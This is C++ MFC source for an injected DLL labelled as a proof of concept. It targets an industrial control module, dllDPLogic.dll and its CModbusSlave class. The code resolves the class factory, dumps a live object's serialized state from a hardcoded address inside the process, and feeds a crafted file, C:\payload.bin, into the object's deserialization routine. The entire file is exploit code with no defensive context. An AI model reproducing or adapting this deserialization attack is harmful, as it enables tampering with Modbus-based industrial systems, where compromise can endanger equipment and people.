#include <afx.h>
#include <afxwin.h>
#include <fstream>
#include <vector>

typedef CRuntimeClass* (__stdcall* PGET_CLASS)();

void InjectPayload() {
    const char* path = "C:\\payload.bin";
    CFile f;
    CFileException fe;
    if (!f.Open(path, CFile::modeRead | CFile::typeBinary, &fe)) {
        ::MessageBox(NULL, "Payload file not found!", "Error", MB_OK);
        return;
    }

    int len = (int)f.GetLength();
    std::vector<char> buf(len);
    f.Read(buf.data(), len);
    f.Close();

    CMemFile memFile((BYTE*)buf.data(), len);
    CArchive ar(&memFile, CArchive::load);

    HMODULE hDll = GetModuleHandle(_T("dllDPLogic.dll"));
    if (!hDll) {
        ::MessageBox(NULL, "dllDPLogic.dll not loaded!", "Error", MB_OK);
        return;
    }

    FARPROC proc = GetProcAddress(hDll, "?GetThisClass@CModbusSlave@@SGPAUCRuntimeClass@@XZ");
    if (!proc) {
        ::MessageBox(NULL, "Factory not found!", "Error", MB_OK);
        return;
    }

    PGET_CLASS getClass = reinterpret_cast<PGET_CLASS>(proc);
    CRuntimeClass* runtimeClass = getClass ? getClass() : nullptr;
    if (!runtimeClass) {
        ::MessageBox(NULL, "Runtime class is null!", "Error", MB_OK);
        return;
    }

    CObject* obj = runtimeClass->CreateObject();
    if (!obj) {
        ::MessageBox(NULL, "CreateObject failed!", "Error", MB_OK);
        return;
    }

    try {
        obj->Serialize(ar);
        ::MessageBox(NULL, "Payload Verified Successfully!", "Success", MB_OK);
    }
    catch (CArchiveException* e) {
        CString msg;
        msg.Format("Serialize Error! Code: %d\n3=Schema/Version\n4=BadIndex\n6=End of File", e->m_cause);
        ::MessageBox(NULL, msg, "Debug Info", MB_OK | MB_ICONERROR);
        e->Delete();
    }
    catch (...) {
        ::MessageBox(NULL, "Unknown Crash", "Fatal", MB_OK);
    }
}

extern "C" __declspec(dllexport) void RunPoc() {
    AFX_MANAGE_STATE(AfxGetStaticModuleState());

    void* pRealObj = (void*)0x0F2D2A04;

    if (IsBadReadPtr(pRealObj, 4)) {
        ::MessageBox(NULL, "Memory address 0F2D2A04 is invalid!\nDid you close the project?", "Error", MB_OK);
        InjectPayload();
        return;
    }

    CFile fDump;
    if (!fDump.Open("C:\\valid_dump.bin", CFile::modeCreate | CFile::modeWrite | CFile::typeBinary)) {
        ::MessageBox(NULL, "Cannot create C:\\valid_dump.bin", "Error", MB_OK);
        return;
    }

    CArchive arStore(&fDump, CArchive::store);

    try {
        CObject* pSlave = (CObject*)pRealObj;
        pSlave->Serialize(arStore);

        arStore.Close();
        fDump.Close();

        ::MessageBox(NULL, "✅ GOLDEN SAMPLE DUMPED!\nLocation: C:\\valid_dump.bin\nPlease analyze this file.", "Success", MB_OK);
    }
    catch (...) {
        InjectPayload();
    }
}
